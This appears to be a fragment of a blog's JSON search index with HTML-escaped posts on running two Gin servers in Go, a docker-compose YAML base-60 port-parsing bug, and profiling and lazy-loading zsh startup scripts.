style=\"color:#e6db74\"\u003e\u0026#34;log\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;net/http\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;time\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;github.com/gin-gonic/gin\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;golang.org/x/sync/errgroup\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eg\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerrgroup\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eGroup\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003erouter01\u003c/span\u003e() \u003cspan style=\"color:#a6e22e\"\u003ehttp\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eHandler\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ee\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003egin\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eNew\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ee\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eUse\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003egin\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eRecovery\u003c/span\u003e())\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ee\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eGET\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003egin\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eContext\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eJSON\u003c/span\u003e(\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003ehttp\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eStatusOK\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003egin\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eH\u003c/span\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;code\u0026#34;\u003c/span\u003e:  \u003cspan style=\"color:#a6e22e\"\u003ehttp\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eStatusOK\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;error\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Welcome server 01\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t},\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t})\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ee\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003erouter02\u003c/span\u003e() \u003cspan style=\"color:#a6e22e\"\u003ehttp\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eHandler\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ee\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003egin\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eNew\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ee\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eUse\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003egin\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eRecovery\u003c/span\u003e())\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ee\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eGET\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003egin\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eContext\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eJSON\u003c/span\u003e(\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003ehttp\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eStatusOK\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003egin\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eH\u003c/span\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;code\u0026#34;\u003c/span\u003e:  \u003cspan style=\"color:#a6e22e\"\u003ehttp\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eStatusOK\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;error\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Welcome server 02\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t},\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t})\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ee\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eserver01\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ehttp\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eServer\u003c/span\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003eAddr\u003c/span\u003e:         \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;:8080\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003eHandler\u003c/span\u003e:      \u003cspan style=\"color:#a6e22e\"\u003erouter01\u003c/span\u003e(),\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003eReadTimeout\u003c/span\u003e:  \u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eSecond\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003eWriteTimeout\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e10\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eSecond\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eserver02\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ehttp\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eServer\u003c/span\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003eAddr\u003c/span\u003e:         \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;:8081\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003eHandler\u003c/span\u003e:      \u003cspan style=\"color:#a6e22e\"\u003erouter02\u003c/span\u003e(),\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003eReadTimeout\u003c/span\u003e:  \u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eSecond\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003eWriteTimeout\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e10\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eSecond\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eg\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eGo\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() \u003cspan style=\"color:#66d9ef\"\u003eerror\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eserver01\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eListenAndServe\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t})\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eg\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eGo\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() \u003cspan style=\"color:#66d9ef\"\u003eerror\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eserver02\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eListenAndServe\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t})\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eg\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eWait\u003c/span\u003e(); \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003elog\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eFatal\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"xmljsonyaml-和-protobuf-渲染输出格式\"\u003eXML、JSON、YAML 和 ProtoBuf 渲染（输出格式）\u003c/h3\u003e\n\u003ch4 id=\"securejson\"\u003eSecureJSON\u003c/h4\u003e\n\u003cblockquote\u003e\n\u003cp\u003e使用 SecureJSON 可以防止 json 劫持，如果返回的数据是数组，则会默认在返回值前加上\u0026quot;while(1)\u0026quot;\u003c/p\u003e","tags":["URL","Go","Gin"],"title":"Gin中文文档"},{"categories":["Docker"],"contents":"issue # ./docker-compose up -d Creating network \u0026#34;gogs_default\u0026#34; with the default driver Creating gogs_mysql_1 ... done Creating gogs_gogs_1 ... error ERROR: for gogs_gogs_1 Cannot create container for service gogs: invalid port specification: \u0026#34;133342\u0026#34; ERROR: for gogs Cannot create container for service gogs: invalid port specification: \u0026#34;133342\u0026#34; ERROR: Encountered errors while bringing up the project. services: gogs: ports: - 2222:22 YAML supports so-called \u0026ldquo;base-60 floating-point numbers,\u0026rdquo; which is useful for time calculations.\nTherefore, 2222:22 is interpreted as 2222 * 60 + 22, which is 133342.\nIf the port contains numbers greater than 60, such as 3306:3306 or 8080:80, there is no problem, so this issue doesn\u0026rsquo;t always occur, making it somewhat obscure.\nsolve services: gogs: ports: - \u0026#34;2222:22\u0026#34; ","date":"July 19, 2021","hero":"/images/hero/docker.jpeg","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20210719-docker-compose-yaml-problem/","summary":"\u003ch4 id=\"issue\"\u003eissue\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# ./docker-compose up -d\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eCreating network \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;gogs_default\u0026#34;\u003c/span\u003e with the default driver\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eCreating gogs_mysql_1 ... \u003cspan style=\"color:#66d9ef\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eCreating gogs_gogs_1  ... error\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eERROR: \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e gogs_gogs_1  Cannot create container \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e service gogs: invalid port specification: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;133342\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eERROR: \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e gogs  Cannot create container \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e service gogs: invalid port specification: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;133342\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eERROR: Encountered errors \u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e bringing up the project.\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eservices\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003egogs\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eports\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003e2222\u003c/span\u003e:\u003cspan style=\"color:#ae81ff\"\u003e22\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eYAML supports so-called \u0026ldquo;base-60 floating-point numbers,\u0026rdquo; which is useful for time calculations.\u003c/p\u003e\n\u003cp\u003eTherefore, \u003ccode\u003e2222:22\u003c/code\u003e is interpreted as \u003ccode\u003e2222 * 60 + 22\u003c/code\u003e, which is 133342.\u003c/p\u003e","tags":["Docker"],"title":"docker-compose yaml problem"},{"categories":["URL","Browser","Network","HTTP","DNS","Cache"],"contents":" 在瀏覽器輸入網址並送出後，到底發生了什麼事？ ","date":"July 18, 2021","hero":"/images/hero/network.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20210718-what-happens-when-you-type-an-url-in-the-browser-and-press-enter/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.cythilya.tw/2018/11/26/what-happens-when-you-type-an-url-in-the-browser-and-press-enter/\" target=\"_blank\" rel=\"noopener\"\u003e在瀏覽器輸入網址並送出後，到底發生了什麼事？\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Browser","Network","HTTP","DNS","Cache"],"title":"在瀏覽器輸入網址並送出後，到底發生了什麼事？"},{"categories":["URL","Zsh"],"contents":" 我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化 Profiling # .zshrc zmodload zsh/zprof $ /bin/zsh $ zprof num calls time self name ----------------------------------------------------------------------------------- 1) 1 395.66 395.66 33.10% 395.59 395.59 33.09% _zsh_nvm_auto_use 2) 1 216.22 216.22 18.09% 216.13 216.13 18.08% nvm_die_on_prefix 3) 1 648.00 648.00 54.20% 168.85 168.85 14.12% nvm_auto 4) 2 479.15 239.57 40.08% 160.50 80.25 13.43% nvm 5) 1 102.30 102.30 8.56% 84.99 84.99 7.11% nvm_ensure_version_installed 6) 2 51.21 25.60 4.28% 29.55 14.78 2.47% compinit 7) 1 680.18 680.18 56.89% 22.17 22.17 1.85% _zsh_nvm_load 8) 2 21.66 10.83 1.81% 21.66 10.83 1.81% compaudit 9) 1 17.31 17.31 1.45% 17.31 17.31 1.45% nvm_is_version_installed 10) 193 17.43 0.09 1.46% 14.50 0.08 1.21% _zsh_autosuggest_bind_widget [Redacted] zprof 模块只能获取每个 zsh 函数的用时，因此适合找出拖累 zsh 冷启动的 oh my zsh 的插件。如果要获取完整的 .zshrc 性能分析，应该使用 xtrace。在 .zshrc 开头添加如下命令\n# .zshrc zmodload zsh/datetime setopt PROMPT_SUBST PS4=\u0026#39;+$EPOCHREALTIME %N:%i\u0026gt; \u0026#39; logfile=$(mktemp zsh_profile.7Pw1Ny0G) echo \u0026#34;Logging to $logfile\u0026#34; exec 3\u0026gt;\u0026amp;2 2\u0026gt;$logfile setopt XTRACE # ... # 并在 .zshrc 结尾添加如下命令 unsetopt XTRACE exec 2\u0026gt;\u0026amp;3 3\u0026gt;\u0026amp;- 这会在 $HOME 目录下生成一个文件名包含随机字符串的文件（zsh_profile.123456 ）。一些介绍 zsh profiling 的文章会推荐使用 kcachegrind 这个工具可视化这个文件，但是我们只需要知道是什么拖累了 zsh 冷启动，将这个文件格式化一下即可。这里提供一个简单的脚本\n# $HOME/format_profile.zsh #!/usr/bin/env zsh typeset -a lines typeset -i prev_time=0 typeset prev_command while read line; do if [[ $line =~ \u0026#39;^.*\\+([0-9]{10})\\.([0-9]{6})[0-9]* (.+)\u0026#39; ]]; then integer this_time=$match[1]$match[2] if [[ $prev_time -gt 0 ]]; then time_difference=$(( $this_time - $prev_time )) lines+=\u0026#34;$time_difference $prev_command\u0026#34; fi prev_time=$this_time local this_command=$match[3] if [[ ${#this_command} -le 80 ]]; then prev_command=$this_command else prev_command=\u0026#34;${this_command:0:77}...\u0026#34; fi fi done \u0026lt; ${1:-/dev/stdin} print -l ${(@On)lines} $ cd $HOME $ chmod +x format_profile.zsh $ ./format_profile.zsh zsh_profile.123456 | head -n 30 356910 _zsh_nvm_auto_use:14\u0026gt; [[ none != N/A ]] 307791 /Users/sukka/.zshrc:312\u0026gt; hexo \u0026#39;--completion=zsh\u0026#39; 178444 /Users/sukka/.zshrc:310\u0026gt; thefuck --alias 161193 nvm_version:21\u0026gt; VERSION=N/A 148555 nvm_version:21\u0026gt; VERSION=N/A 96497 (eval):4\u0026gt; pyenv rehash 58759 /Users/sukka/.zshrc:311\u0026gt; pyenv init - 48629 nvm_auto:15\u0026gt; VERSION=\u0026#39;\u0026#39; 42779 /Users/sukka/.zshrc:114\u0026gt; FPATH=/usr/local/share/zsh/site-functions:/usr/local... 42527 nvm_auto:15\u0026gt; nvm_resolve_local_alias default 41620 nvm_resolve_local_alias:7\u0026gt; VERSION=\u0026#39;\u0026#39; 35577 nvm_resolve_local_alias:7\u0026gt; VERSION=\u0026#39;\u0026#39; 29444 _zsh_nvm_load:6\u0026gt; source /Users/sukka/.nvm/nvm.sh 24967 compaudit:154\u0026gt; _i_wfiles=( ) 24889 nvm_resolve_alias:15\u0026gt; ALIAS_TEMP=\u0026#39;\u0026#39; 22000 nvm_auto:18\u0026gt; nvm_rc_version 20890 nvm_ls:29\u0026gt; PATTERN=default [Redacted] 这样就一目了然了。可以看到，除了 nvm 以外、hexo 的自动补全、thefuck 的初始化、pyenv 都大幅拖慢了 zsh 的启动速度。\nLazyload # 提前将 .pyenv/shims 添加到 PATH 中，这样即使 pyenv 没有初始化也可以使用 Python export PATH=\u0026#34;/Users/sukka/.pyenv/shims:${PATH}\u0026#34; pyenv() { # 移除占位函数 unfuntion pyenv # 初始化 pyenv eval \u0026#34;$(command pyenv init -)\u0026#34; # 继续执行 pyenv 命令 pyenv \u0026#34;$@\u0026#34; } ##### pyenv 在初始化时会自动加载补全（completion），但是由于 lazyload、第一次执行 pyenv 时就没有补全了，因此还需要为补全添加 lazyload __lazyload_completion_pyenv() { # 删除 pyenv 命令补全的占位 comdef -d pyenv # 移除 pyenv 占位函数 unfunction pyenv # 加载真正的 pyenv 命令补全 source \u0026#34;$(brew --prefix pyenv)/completions/pyenv.zsh\u0026#34; } compdef __lazyload_completion_pyenv pyenv 这样，当首次输入 pyenv 并按下 Tab 时会加载 pyenv 的命令补全，第二次按下 Tab 时就可以正常显示命令补全了。\n将上述 lazyload 封装成函数便于调用：\nsukka_lazyload_add_command() { eval \u0026#34;$1() { \\ unfunction $1 \\ _sukka_lazyload__command_$1 \\ $1 \\$@ \\ }\u0026#34; } 